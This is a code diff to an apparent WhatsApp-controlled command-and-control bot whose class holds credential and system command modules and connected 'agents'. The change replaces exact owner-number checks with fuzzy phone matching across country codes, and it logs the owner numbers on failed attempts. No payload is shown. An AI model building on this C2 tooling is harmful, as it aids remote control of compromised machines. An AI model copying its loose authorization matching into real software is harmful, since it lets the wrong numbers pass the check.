@@ -31,7 +31,10 @@ class WhatsAppC2Bot {
     this.apiBridge = null;                  // REST API bridge for Python server
     this.currentSession = null;
     this.commandPrefix = this.config.whatsapp.prefix;
-    this.ownerNumbers = this.config.whatsapp.ownerNumbers;
+    // Ensure ownerNumbers is always an array
+    this.ownerNumbers = Array.isArray(this.config.whatsapp.ownerNumbers)
+      ? this.config.whatsapp.ownerNumbers
+      : [this.config.whatsapp.ownerNumbers];
     this.agents = {};                       // Cache of connected agents
 
     // Command modules will be initialized after socket connection
@@ -39,6 +42,103 @@ class WhatsAppC2Bot {
     this.credentialCmd = new CredentialCommands(null, null);
     this.systemCmd = new SystemCommands(null, null);
     this.funCmd = new FunCommands(null, null);
+  }
+
+  /**
+   * Extract digits-only phone number from any format
+   */
+  extractDigits(input) {
+    if (!input) return null;
+    const digits = input.replace(/\D/g, '');
+    return digits || null;
+  }
+
+  /**
+   * Generate all possible variants of a phone number for matching
+   * Handles country code prefixes (e.g., +263 for Zimbabwe)
+   * Baileys might send: 263781564004, 781564004, or with different country codes
+   */
+  generatePhoneVariants(phoneNumber) {
+    const digits = this.extractDigits(phoneNumber);
+    if (!digits) return [];
+
+    const variants = new Set();
+
+    // Add the original
+    variants.add(digits);
+
+    // For numbers starting with country code (e.g., 263...)
+    // Generate local format variant (remove country code)
+    if (digits.length > 10) {
+      // Try common country code lengths (1, 2, 3 digits)
+      for (let ccLength of [1, 2, 3]) {
+        const potentialLocal = digits.substring(ccLength);
+        if (potentialLocal.length >= 9) {
+          variants.add(potentialLocal);
+        }
+      }
+    }
+
+    // For local format (e.g., 781564004)
+    // Generate international variants with common African country codes
+    const africaCountryCodes = [
+      '27',   // South Africa
+      '256',  // Uganda
+      '258',  // Mozambique
+      '263',  // Zimbabwe
+      '265',  // Malawi
+      '267',  // Botswana
+      '268',  // Eswatini
+      '260',  // Zambia
+      '254',  // Kenya
+      '231',  // Liberia
+      '212',  // Morocco
+      '20',   // Egypt
+    ];
+
+    // If number is 9-10 digits (likely local), try adding country codes
+    if (digits.length >= 9 && digits.length <= 10) {
+      africaCountryCodes.forEach(cc => {
+        variants.add(cc + digits);
+      });
+    }
+
+    return Array.from(variants);
+  }
+
+  /**
+   * Check if a given JID matches any authorized numbers
+   * Uses intelligent matching with country code handling
+   */
+  isAuthorized(userJid) {
+    if (!userJid) return false;
+
+    // Get all variants of the incoming JID
+    const incomingVariants = this.generatePhoneVariants(userJid);
+
+    // Check against all authorized numbers
+    for (const owner of this.ownerNumbers) {
+      const ownerVariants = this.generatePhoneVariants(owner);
+
+      // Check if any variant matches
+      const hasMatch = incomingVariants.some(incomingVar =>
+        ownerVariants.some(ownerVar => ownerVar === incomingVar)
+      );
+
+      if (hasMatch) {
+        return true;
+      }
+    }
+
+    // Debug logging for failed auth
+    ResponseFormatter.log('debug', `Auth failed - Incoming: ${userJid}`);
+    ResponseFormatter.log('debug', `Incoming variants: ${JSON.stringify(this.generatePhoneVariants(userJid))}`);
+    ResponseFormatter.log('debug', `Owner numbers: ${JSON.stringify(this.ownerNumbers)}`);
+    this.ownerNumbers.forEach(owner => {
+      ResponseFormatter.log('debug', `  ${owner} variants: ${JSON.stringify(this.generatePhoneVariants(owner))}`);
+    });
+
+    return false;
   }
 
   /**
@@ -174,12 +274,7 @@ class WhatsAppC2Bot {
     ResponseFormatter.log('info', 'Bot starting...');
   }
 
-  /**
-   * Check if user is authorized
-   */
-  isAuthorized(userJid) {
-    return this.ownerNumbers.includes(userJid);
-  }
+
 
   /**
    * Handle incoming messages
